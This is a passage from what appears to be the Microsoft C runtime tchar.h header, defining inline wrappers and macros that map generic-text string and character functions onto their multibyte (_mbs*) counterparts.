__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tcsncpy_s, _Post_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(_Success_(return != 0) char *, __RETURN_POLICY_DST, _tcsncpy, _tcsncpy_s, _Out_writes_bytes_(_Count) _Post_maybez_ char, _Out_writes_bytes_(_Count) _Post_maybez_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)
{
    return (char *)_mbsnbcpy((unsigned char *)_Dst,(const unsigned char *)_Source,_Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsncpy, _tcsncpy_s, _Out_writes_z_(_Size) char, _Inout_z_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)

_Check_return_wat_ __inline errno_t _tcsncpy_s_l(_Out_writes_z_(_Destination_size_chars) char * _Destination, _In_ size_t _Destination_size_chars, _In_z_ const char * _Source,_In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsnbcpy_s_l((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source,_Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _tcsncpy_s_l, _Post_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsncpy_l, _tcsncpy_s_l, _Out_writes_z_(_Size) char, _Out_writes_bytes_(_Count) _Post_maybez_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsnbcpy_l((unsigned char *)_Dst,(const unsigned char *)_Source,_Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsncpy_l, _tcsncpy_s_l, _Out_writes_z_(_Size) char, _Out_writes_z_(_Count), char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

_Check_return_ __inline _CRPC _tcspbrk(_In_z_ _CPC _s1,_In_z_ _CPC _s2) {return (_CRPC)_mbspbrk((_CPUC)_s1,(_CPUC)_s2);}
_Check_return_ __inline _CRPC _tcsrchr(_In_z_ _CPC _s1,_In_ _UI _c) {return (_CRPC)_mbsrchr((_CPUC)_s1,_c);}
_Check_return_ __inline size_t _tcsspn(_In_z_ _CPC _s1,_In_z_ _CPC _s2) {return _mbsspn((_CPUC)_s1,(_CPUC)_s2);}
_Check_return_ __inline _CRPC _tcsstr(_In_z_ _CPC _s1,_In_z_ _CPC _s2) {return (_CRPC)_mbsstr((_CPUC)_s1,(_CPUC)_s2);}

_Check_return_ _CRT_INSECURE_DEPRECATE(_tcstok_s) __inline char *  _tcstok(_Inout_opt_z_ char * _String,_In_z_ const char * _Delimiters)
{
        return (char * )_mbstok((unsigned char *)_String,(const unsigned char *)_Delimiters);
}

_Check_return_ __inline char *  _tcstok_s(_Inout_opt_z_ char * _String,_In_z_ const char * _Delimiters, _Inout_ _Deref_prepost_opt_z_ char **_Current_position)
{
        return (char * )_mbstok_s((unsigned char *)_String,(const unsigned char *)_Delimiters, (unsigned char **)_Current_position);
}

_Check_return_ _CRT_INSECURE_DEPRECATE(_tcstok_s_l) __inline char *  _tcstok_l(_Inout_opt_z_ char * _String,_In_z_ const char * _Delimiters, _In_opt_ _locale_t _Locale)
{
        return (char * )_mbstok_l((unsigned char *)_String,(const unsigned char *)_Delimiters, _Locale);
}

_Check_return_ __inline char *  _tcstok_s_l(_Inout_opt_z_ char * _String,_In_z_ const char * _Delimiters, _Inout_ _Deref_prepost_opt_z_ char **_Current_position, _In_opt_ _locale_t _Locale)
{
        return (char * )_mbstok_s_l((unsigned char *)_String,(const unsigned char *)_Delimiters, (unsigned char **)_Current_position, _Locale);
}

_Check_return_wat_ __inline errno_t _tcsnset_s(_Inout_updates_z_(_SizeInBytes) char * _Dst, _In_ size_t _SizeInBytes, _In_ unsigned int _Value , _In_ size_t _Count)
{
    return _mbsnbset_s((unsigned char *)_Dst, _SizeInBytes, _Value, _Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tcsnset_s, _Prepost_z_ char, _Dest, _In_ unsigned int, _Value , _In_ size_t, _Count)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsnset, _tcsnset_s, _Inout_updates_z_(_Size) char, _Inout_updates_z_(_Count) char, _Dst, _In_ unsigned int, _Value , _In_ size_t, _Count)
{
    return (char *)_mbsnbset((unsigned char *)_Dst, _Value, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsnset, _tcsnset_s, _Inout_updates_z_(_Size) char, _Inout_updates_z_(_Count), char, _Dst, _In_ unsigned int, _Value , _In_ size_t, _Count)

_Check_return_wat_ __inline errno_t _tcsnset_s_l(_Inout_updates_z_(_SizeInBytes) char * _Dst, _In_ size_t _SizeInBytes, _In_ unsigned int _Value , _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsnbset_s_l((unsigned char *)_Dst, _SizeInBytes, _Value, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _tcsnset_s_l, _Prepost_z_ char, _Dest, _In_ unsigned int, _Value , _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsnset_l, _tcsnset_s_l, _Inout_updates_z_(_Size) char, _Inout_updates_z_(_Count) char, _Dst, _In_ unsigned int, _Value , _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsnbset_l((unsigned char *)_Dst, _Value, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsnset_l, _tcsnset_s_l, _Inout_updates_z_(_Size) char, _Inout_updates_z_(_Count), char, _Dst, _In_ unsigned int, _Value , _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__inline _PC _tcsrev(_Inout_z_ _PC _s1) {return (_PC)_mbsrev((_PUC)_s1);}

_Check_return_wat_ __inline errno_t _tcsset_s(_Inout_updates_z_(_SizeInBytes) char * _Dst, _In_ size_t _SizeInBytes, _In_ unsigned int _Value)
{
    return _mbsset_s((unsigned char *)_Dst, _SizeInBytes, _Value);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_1(errno_t, _tcsset_s, _Prepost_z_ char, _Dest, _In_ unsigned int, _Value)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_1_EX(char *, __RETURN_POLICY_DST, _tcsset, _tcsset_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_ unsigned int, _Value)
{
    return (char *)_mbsset((unsigned char *)_Dst, _Value);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_1_EX(char *, __RETURN_POLICY_DST, _tcsset, _tcsset_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_ unsigned int, _Value)

_Check_return_wat_ __inline errno_t _tcsset_s_l(_Inout_updates_z_(_SizeInBytes) char * _Dst, _In_ size_t _SizeInBytes, _In_ unsigned int _Value, _In_opt_ _locale_t _Locale)
{
    return _mbsset_s_l((unsigned char *)_Dst, _SizeInBytes, _Value, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tcsset_s_l, _Prepost_z_ char, _Dest, _In_ unsigned int, _Value, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsset_l, _tcsset_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_ unsigned int, _Value, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsset_l((unsigned char *)_Dst, _Value, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsset_l, _tcsset_s_l, _Inout_updates_z_(_Size) char, _Inout_z_, char, _Dst, _In_ unsigned int, _Value, _In_opt_ _locale_t, _Locale)

_Check_return_ __inline int _tcscmp(_In_z_ _CPC _s1,_In_z_ _CPC _s2) {return _mbscmp((_CPUC)_s1,(_CPUC)_s2);}

_Check_return_ __inline int _tcsicmp(_In_z_ const char * _String1, _In_z_ const char * _String2)
{
    return _mbsicmp((const unsigned char *)_String1,(const unsigned char *)_String2);
}

_Check_return_ __inline int _tcsicmp_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_opt_ _locale_t _Locale)
{
    return _mbsicmp_l((const unsigned char *)_String1,(const unsigned char *)_String2, _Locale);
}

_Check_return_ __inline int _tcsnccmp(_In_reads_or_z_(_n) _CPC _s1,_In_z_ _CPC _s2,_In_ size_t _n) {return _mbsncmp((_CPUC)_s1,(_CPUC)_s2,_n);}
__inline int _tcsncmp(_In_z_ _CPC _s1,_In_z_ _CPC _s2,_In_ size_t _n) {return _mbsnbcmp((_CPUC)_s1,(_CPUC)_s2,_n);}

_Check_return_ __inline int _tcsncicmp(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Char_count)
{
    return _mbsnicmp((const unsigned char *)_String1,(const unsigned char *)_String2,_Char_count);
}

_Check_return_ __inline int _tcsncicmp_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Char_count, _In_opt_ _locale_t _Locale)
{
    return _mbsnicmp_l((const unsigned char *)_String1,(const unsigned char *)_String2,_Char_count, _Locale);
}

_Check_return_ __inline int _tcsnicmp(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Char_count)
{
    return _mbsnbicmp((const unsigned char *)_String1,(const unsigned char *)_String2,_Char_count);
}

_Check_return_ __inline int _tcsnicmp_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Char_count, _In_opt_ _locale_t _Locale)
{
    return _mbsnbicmp_l((const unsigned char *)_String1,(const unsigned char *)_String2,_Char_count, _Locale);
}

_Check_return_ __inline int _tcscoll(_In_z_ const char * _String1, _In_z_ const char * _String2)
{
    return _mbscoll((const unsigned char *)_String1,(const unsigned char *)_String2);
}

_Check_return_ __inline int _tcscoll_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_opt_ _locale_t _Locale)
{
    return _mbscoll_l((const unsigned char *)_String1,(const unsigned char *)_String2, _Locale);
}

_Check_return_ __inline int _tcsicoll(_In_z_ const char * _String1, _In_z_ const char * _String2)
{
    return _mbsicoll((const unsigned char *)_String1,(const unsigned char *)_String2);
}

_Check_return_ __inline int _tcsicoll_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_opt_ _locale_t _Locale)
{
    return _mbsicoll_l((const unsigned char *)_String1,(const unsigned char *)_String2, _Locale);
}

_Check_return_ __inline int _tcsnccoll(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count)
{
    return _mbsncoll((const unsigned char *)_String1,(const unsigned char *)_String2, _Count);
}

_Check_return_ __inline int _tcsnccoll_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsncoll_l((const unsigned char *)_String1,(const unsigned char *)_String2, _Count, _Locale);
}

_Check_return_ __inline int _tcsncoll(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count)
{
    return _mbsnbcoll((const unsigned char *)_String1,(const unsigned char *)_String2, _Count);
}

_Check_return_ __inline int _tcsncoll_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsnbcoll_l((const unsigned char *)_String1,(const unsigned char *)_String2, _Count, _Locale);
}

_Check_return_ __inline int _tcsncicoll(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count)
{
    return _mbsnicoll((const unsigned char *)_String1,(const unsigned char *)_String2, _Count);
}

_Check_return_ __inline int _tcsncicoll_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsnicoll_l((const unsigned char *)_String1,(const unsigned char *)_String2, _Count, _Locale);
}

_Check_return_ __inline int _tcsnicoll(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count)
{
    return _mbsnbicoll((const unsigned char *)_String1,(const unsigned char *)_String2, _Count);
}

_Check_return_ __inline int _tcsnicoll_l(_In_z_ const char * _String1, _In_z_ const char * _String2, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsnbicoll_l((const unsigned char *)_String1,(const unsigned char *)_String2, _Count, _Locale);
}

/* "logical-character" mappings */
_Check_return_ __inline size_t _tcsclen(_In_z_ const char * _String)
{
    return _mbslen((const unsigned char *)_String);
}

_Check_return_ __inline size_t _tcscnlen(_In_z_ const char * _String, _In_ size_t _Maximum)
{
    return _mbsnlen((const unsigned char *)_String, _Maximum);
}

_Check_return_ __inline size_t _tcsclen_l(_In_z_ const char * _String, _In_opt_ _locale_t _Locale)
{
    return _mbslen_l((const unsigned char *)_String, _Locale);
}

_Check_return_ __inline size_t _tcscnlen_l(_In_z_ const char * _String, _In_ size_t _Maximum, _In_opt_ _locale_t _Locale)
{
    return _mbsnlen_l((const unsigned char *)_String, _Maximum, _Locale);
}

_Check_return_wat_ __inline errno_t _tcsnccat_s(_Inout_updates_z_(_Destination_size_chars) char * _Destination, _In_ size_t _Destination_size_chars, _In_z_ const char * _Source, _In_ size_t _Count)
{
    return _mbsncat_s((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source, _Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tcsnccat_s, _Prepost_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsnccat, _tcsnccat_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)
{
    return (char *)_mbsncat((unsigned char *)_Dst,(const unsigned char *)_Source, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsnccat, _tcsnccat_s, _Inout_updates_z_(_Size) char, _Inout_z_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)

_Check_return_wat_ __inline errno_t _tcsnccat_s_l(_Inout_updates_z_(_Destination_size_chars) char * _Destination, _In_ size_t _Destination_size_chars, _In_z_ const char * _Source, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsncat_s_l((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _tcsnccat_s_l, _Prepost_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsnccat_l, _tcsnccat_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsncat_l((unsigned char *)_Dst,(const unsigned char *)_Source, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsnccat_l, _tcsnccat_s_l, _Inout_updates_z_(_Size) char, _Inout_z_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

_Check_return_wat_ __inline errno_t _tcsnccpy_s(_Out_writes_z_(_Destination_size_chars) char * _Destination, _In_ size_t _Destination_size_chars, _In_z_ const char * _Source, _In_ size_t _Count)
{
    return _mbsncpy_s((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source, _Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tcsnccpy_s, _Post_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsnccpy, _tcsnccpy_s, _Out_writes_bytes_(_Size) _Post_maybez_ char, _Pre_notnull_ _Post_maybez_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)
{
    return (char *)_mbsncpy((unsigned char *)_Dst,(const unsigned char *)_Source, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsnccpy, _tcsnccpy_s, _Out_writes_z_(_Size) char, _Pre_notnull_ _Post_z_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count)

_Check_return_wat_ __inline errno_t _tcsnccpy_s_l(_Out_writes_z_(_Destination_size_chars) char * _Destination, _In_ size_t _Destination_size_chars, _In_z_ const char * _Source, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsncpy_s_l((unsigned char *)_Destination, _Destination_size_chars, (const unsigned char *)_Source, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _tcsnccpy_s_l, _Post_z_ char, _Dest, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsnccpy_l, _tcsnccpy_s_l, _Out_writes_z_(_Size) char, _Out_writes_bytes_(_Count) _Post_maybez_ char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsncpy_l((unsigned char *)_Dst,(const unsigned char *)_Source, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsnccpy_l, _tcsnccpy_s_l, _Out_writes_z_(_Size) char, _Out_writes_bytes_(_Count) _Post_maybez_, char, _Dst, _In_z_ const char *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

_Check_return_wat_ __inline errno_t _tcsncset_s(_Inout_updates_bytes_(_SizeInBytes) char *_Destination, _In_ size_t _SizeInBytes, _In_ unsigned int _Value, _In_ size_t _Count)
{
    return _mbsnset_s((unsigned char *)_Destination, _SizeInBytes, _Value, _Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tcsncset_s, char, _Dest, _In_ unsigned int, _Value, _In_ size_t, _Count)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsncset, _tcsncset_s, _Inout_updates_z_(_Size) char, _Inout_updates_bytes_(_Count) char, _Dst, _In_ unsigned int, _Value, _In_ size_t, _Count)
{
    return (char *)_mbsnset((unsigned char *)_Dst, _Value, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_2_EX(char *, __RETURN_POLICY_DST, _tcsncset, _tcsncset_s, _Inout_updates_z_(_Size) char, _Inout_updates_bytes_(_Count), char, _Dst, _In_ unsigned int, _Value, _In_ size_t, _Count)

_Check_return_wat_ __inline errno_t _tcsncset_s_l(_Inout_updates_bytes_(_SizeInBytes) char *_Destination, _In_ size_t _SizeInBytes, _In_ unsigned int _Value, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsnset_s_l((unsigned char *)_Destination, _SizeInBytes, _Value, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _tcsncset_s_l, char, _Dest, _In_ unsigned int, _Value, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsncset_l, _tcsncset_s_l, _Inout_updates_z_(_Size) char, _Inout_updates_bytes_(_Count) char, _Dst, _In_ unsigned int, _Value, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsnset_l((unsigned char *)_Dst, _Value, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(char *, __RETURN_POLICY_DST, _tcsncset_l, _tcsncset_s_l, _Inout_updates_z_(_Size) char, _Inout_updates_bytes_(_Count), char, _Dst, _In_ unsigned int, _Value, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

/* MBCS-specific mappings */

_Check_return_ __inline _PC _tcsdec(_In_reads_z_(_s2 - _s1 + 1) _CPC _s1,_In_z_ _CPC _s2) {return (_PC)_mbsdec((_CPUC)_s1,(_CPUC)_s2);}
_Check_return_ __inline _PC _tcsinc(_In_z_ _CPC _s1) {return (_PC)_mbsinc((_CPUC)_s1);}
_Check_return_ __inline size_t _tcsnbcnt(_In_reads_or_z_(_n) _CPC _s1,_In_ size_t _n) {return _mbsnbcnt((_CPUC)_s1,_n);}
_Check_return_ __inline size_t _tcsnccnt(_In_reads_or_z_(_n) _CPC _s1,_In_ size_t _n) {return _mbsnccnt((_CPUC)_s1,_n);}
_Check_return_ __inline _PC _tcsninc(_In_reads_or_z_(_n) _CPC _s1,_In_ size_t _n) {return (_PC)_mbsninc((_CPUC)_s1,_n);}
_Check_return_ __inline _PC _tcsspnp(_In_z_ _CPC _s1,_In_z_ _CPC _s2) {return (_PC)_mbsspnp((_CPUC)_s1,(_CPUC)_s2);}

_Check_return_wat_ __inline errno_t _tcslwr_s(_Inout_updates_z_(_SizeInBytes) char * _String, size_t _SizeInBytes)
{
    return _mbslwr_s((unsigned char *)_String, _SizeInBytes);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_0(errno_t, _tcslwr_s, _Prepost_z_ char, _String)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_0_EX(char *, __RETURN_POLICY_DST, _tcslwr, _tcslwr_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String)
{
    return (char *)_mbslwr((unsigned char *)_String);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_0_EX(char *, __RETURN_POLICY_DST, _tcslwr, _tcslwr_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String)

_Check_return_wat_ __inline errno_t _tcslwr_s_l(_Inout_updates_z_(_SizeInBytes) char * _String, _In_ size_t _SizeInBytes, _In_opt_ _locale_t _Locale)
{
    return _mbslwr_s_l((unsigned char *)_String, _SizeInBytes, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_1(errno_t, _tcslwr_s_l, _Prepost_z_ char, _String, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_1_EX(char *, __RETURN_POLICY_DST, _tcslwr_l, _tcslwr_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbslwr_l((unsigned char *)_String, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_1_EX(char *, __RETURN_POLICY_DST, _tcslwr_l, _tcslwr_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String, _In_opt_ _locale_t, _Locale)

_Check_return_wat_ __inline errno_t _tcsupr_s(_Inout_updates_z_(_Count) char * _String, _In_ size_t _Count)
{
    return _mbsupr_s((unsigned char *)_String, _Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_0(errno_t, _tcsupr_s, _Prepost_z_ char, _String)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_0_EX(char *, __RETURN_POLICY_DST, _tcsupr, _tcsupr_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String)
{
    return (char *)_mbsupr((unsigned char *)_String);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_0_EX(char *, __RETURN_POLICY_DST, _tcsupr, _tcsupr_s, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String)

_Check_return_wat_ __inline errno_t _tcsupr_s_l(_Inout_updates_z_(_Count) char * _String, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    return _mbsupr_s_l((unsigned char *)_String, _Count, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_1(errno_t, _tcsupr_s_l, _Prepost_z_ char, _String, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_1_EX(char *, __RETURN_POLICY_DST, _tcsupr_l, _tcsupr_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String, _In_opt_ _locale_t, _Locale)
{
    return (char *)_mbsupr_l((unsigned char *)_String, _Locale);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_1_EX(char *, __RETURN_POLICY_DST, _tcsupr_l, _tcsupr_s_l, _Inout_updates_z_(_Size) char, _Inout_z_ char, _String, _In_opt_ _locale_t, _Locale)

_Check_return_ __inline size_t _tclen(_In_z_ _CPC _s1) {return _mbclen((_CPUC)_s1);}

_Check_return_wat_ __inline errno_t _tccpy_s(_Out_writes_z_(_SizeInBytes) char * _Destination, size_t _SizeInBytes, _Out_opt_ int *_PCopied, _In_z_ const char * _Source)
{
    return _mbccpy_s((unsigned char *)_Destination, _SizeInBytes, _PCopied, (const unsigned char *)_Source);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _tccpy_s, _Post_z_ char, _Dest, _Out_opt_  int *, _PCopied, _In_z_ const char *, _Source)

_CRT_INSECURE_DEPRECATE(_tccpy_s) __inline void _tccpy(_Out_writes_z_(2) char * _Destination, _In_z_ const char * _Source)
{
    _mbccpy((unsigned char *)_Destination, (const unsigned char *)_Source);
}

_Check_return_wat_ __inline errno_t _tccpy_s_l(_Out_writes_z_(_SizeInBytes) char * _Destination, _In_ size_t _SizeInBytes, _Out_opt_ int *_PCopied, _In_z_ const char * _Source, _In_opt_ _locale_t _Locale)
{
    return _mbccpy_s_l((unsigned char *)_Destination, _SizeInBytes, _PCopied, (const unsigned char *)_Source, _Locale);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _tccpy_s_l, _Post_z_ char, _Dest, _Out_opt_ int *, _PCopied, _In_z_ const char *, _Source, _In_opt_ _locale_t, _Locale)

_CRT_INSECURE_DEPRECATE(_tccpy_s_l) __inline void _tccpy_l(_Out_writes_z_(2) char * _Destination, _In_z_ const char * _Source, _In_opt_ _locale_t _Locale)
{
    _mbccpy_l((unsigned char *)_Destination,( const unsigned char *)_Source, _Locale);
}

/* inline helper */
_Check_return_ __inline _UI _tcsnextc(_In_z_ _CPC _s1)
{
    _UI _n=0;
    if (_ismbblead((_UI)*(_PUC)_s1))
    {
        /*  for a dud MBCS string (leadbyte, EOS), we don't move forward 2
            We do not assert here because this routine is too low-level
        */
        if(_s1[1]!='\0')
        {
            _n=((_UI)*(_PUC)_s1)&lt;&lt;8;
            _s1++;
        }
    }
    _n+=(_UI)*(_PUC)_s1;

    return(_n);
}

#endif  /* __STDC__ || defined (_NO_INLINING) */

#ifdef __cplusplus
#ifndef _CPP_TCHAR_INLINES_DEFINED
#define _CPP_TCHAR_INLINES_DEFINED
extern "C++" {
_Check_return_ inline char * __CRTDECL _tcschr(_In_z_ char *_S, _In_ unsigned int _C)
        {return ((char *)_tcschr((const char *)_S, _C)); }
_Check_return_ inline char * __CRTDECL _tcspbrk(_In_z_ char *_S, _In_z_ const char *_P)
        {return ((char *)_tcspbrk((const char *)_S, _P)); }
_Check_return_ inline char * __CRTDECL _tcsrchr(_In_z_ char *_S, _In_ unsigned int _C)
        {return ((char *)_tcsrchr((const char *)_S, _C)); }
_Check_return_ inline char * __CRTDECL _tcsstr(_In_z_ char *_S, _In_z_ const char *_P)
        {return ((char *)_tcsstr((const char *)_S, _P)); }
}
#endif  /* _CPP_TCHAR_INLINES_DEFINED */
#endif  /* __cplusplus */

#endif  /* _MB_MAP_DIRECT */


/* MBCS-specific mappings */

#define _tccmp(_cp1,_cp2)   _tcsnccmp(_cp1,_cp2,1)


/* ctype functions */

#define _istalnum       _ismbcalnum
#define _istalnum_l     _ismbcalnum_l
#define _istalpha       _ismbcalpha
#define _istalpha_l     _ismbcalpha_l
#define _istdigit       _ismbcdigit
#define _istdigit_l     _ismbcdigit_l
#define _istgraph       _ismbcgraph
#define _istgraph_l     _ismbcgraph_l
#define _istlegal       _ismbclegal
#define _istlegal_l     _ismbclegal_l
#define _istlower       _ismbclower
#define _istlower_l     _ismbclower_l
#define _istprint       _ismbcprint
#define _istprint_l     _ismbcprint_l
#define _istpunct       _ismbcpunct
#define _istpunct_l     _ismbcpunct_l
#define _istblank       _ismbcblank
#define _istblank_l     _ismbcblank_l
#define _istspace       _ismbcspace
#define _istspace_l     _ismbcspace_l
#define _istupper       _ismbcupper
#define _istupper_l     _ismbcupper_l

#define _totupper       _mbctoupper
#define _totupper_l     _mbctoupper_l
#define _totlower       _mbctolower
#define _totlower_l     _mbctolower_l

#define _istlead        _ismbblead
#define _istleadbyte    isleadbyte
#define _istleadbyte_l  _isleadbyte_l

#else  /* _MBCS */

/* ++++++++++++++++++++ SBCS ++++++++++++++++++++ */


#ifndef __TCHAR_DEFINED
typedef char            _TCHAR;
typedef signed char     _TSCHAR;
typedef unsigned char   _TUCHAR;
typedef char            _TXCHAR;
